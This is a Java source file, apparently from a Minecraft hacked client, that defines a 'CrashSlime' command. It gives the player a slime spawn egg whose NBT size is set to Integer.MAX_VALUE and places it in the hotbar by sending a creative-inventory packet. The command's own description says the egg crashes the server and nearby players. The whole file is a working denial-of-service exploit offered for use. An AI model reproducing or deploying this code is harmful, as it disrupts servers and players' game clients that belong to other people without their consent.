package net.wheel.cutils.impl.command;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

import net.wheel.cutils.api.command.Command;
import net.wheel.cutils.crack;

public final class CrashSlimeCommand extends Command {

    public CrashSlimeCommand() {
        super("CrashSlime", new String[] { "CSlime", "CrashS" },
                "Gives you a slime spawn egg that crashes the server and nearby players while in creative mode",
                "CrashSlime");
    }

    @Override
    public void exec(String input) {
        if (!this.clamp(input, 1, 1)) {
            this.printUsage();
            return;
        }

        final Minecraft mc = Minecraft.getMinecraft();

        if (!mc.player.isCreative()) {
            crack.INSTANCE.errorChat("Creative mode is required to use this command.");
            return;
        }

        final ItemStack itemStack = new ItemStack(Item.getItemById(383));
        final NBTTagCompound tagCompound = (itemStack.hasTagCompound()) ? itemStack.getTagCompound()
                : new NBTTagCompound();
        final NBTTagCompound entityTag = new NBTTagCompound();

        entityTag.setString("id", "minecraft:slime");
        tagCompound.setTag("EntityTag", entityTag);
        entityTag.setInteger("Size", Integer.MAX_VALUE);
        itemStack.setTagCompound(tagCompound);

        final int slot = this.findEmptyHotbarSlot();

        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(
                36 + (slot != -1 ? slot : mc.player.inventory.currentItem), itemStack));
        crack.INSTANCE.logChat("Gave you a crash slime spawn egg");
    }

    private int findEmptyHotbarSlot() {
        for (int i = 0; i < 9; i++) {
            final ItemStack stack = Minecraft.getMinecraft().player.inventory.getStackInSlot(i);

            if (stack.getItem() == Items.AIR) {
                return i;
            }
        }
        return -1;
    }

}
